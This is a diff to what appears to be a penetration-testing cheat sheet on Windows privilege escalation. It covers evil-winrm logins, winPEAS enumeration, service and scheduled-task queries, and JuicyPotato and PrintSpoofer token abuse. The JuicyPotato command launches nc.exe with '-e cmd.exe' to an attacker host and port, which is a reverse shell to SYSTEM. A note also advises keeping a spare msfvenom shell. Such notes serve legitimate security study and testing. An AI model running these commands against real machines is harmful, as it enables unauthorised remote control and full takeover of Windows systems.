@@ -137,7 +137,7 @@ Enter-PSSession -ComputerName ComputerName -Credential $cred
 
 Using evil-winrm for remote connection:
 ```
-evil-winrm -i 192.168.50.220 -u username -p "password"
+evil-winrm -i $rhosts -u username -p "password"
 ```
 
 ### Automated
@@ -146,7 +146,9 @@ Using winPEAS
 .\winPEASx64.exe
 ```
 NOTE: Remember to use the correspondent winPEAS for your local system.
+
 NOTE2: Remember to get another shell (from msfvenom) to use winPEAS, because sometimes your reverse_shell could crash.
+
 NOTE3: Use it from a bash terminal, because it's colors are configured to be seen from a bash terminal.
 
 ### Windows Services
@@ -193,6 +195,7 @@ wmic service get name,displayname,pathname,startmode | findstr /i "auto" | finds
 schtasks /query /fo LIST /v
 ```
 
+In powershell:
 ```
 Get-ScheduledTask | select TaskName,State
 ```
@@ -201,8 +204,17 @@ Get-ScheduledTask | select TaskName,State
 
 ##### [JuicyPotato](https://github.com/ohpe/juicy-potato)
 ```
-c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *
+c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe $lhost $lport -e cmd.exe" -t * <-c "{clsid}">
 ```
+
+[list of CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
+
+**Process creation mode (-t)**
+depending on the impersonated user's privileges you can choose from:
+
+- CreateProcessWithToken (needs `SeImpersonate`)
+- CreateProcessAsUser (needs `SeAssignPrimaryToken`)
+- both
 
 ##### [PrintSpoofer64](https://github.com/itm4n/PrintSpoofer)
 From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.
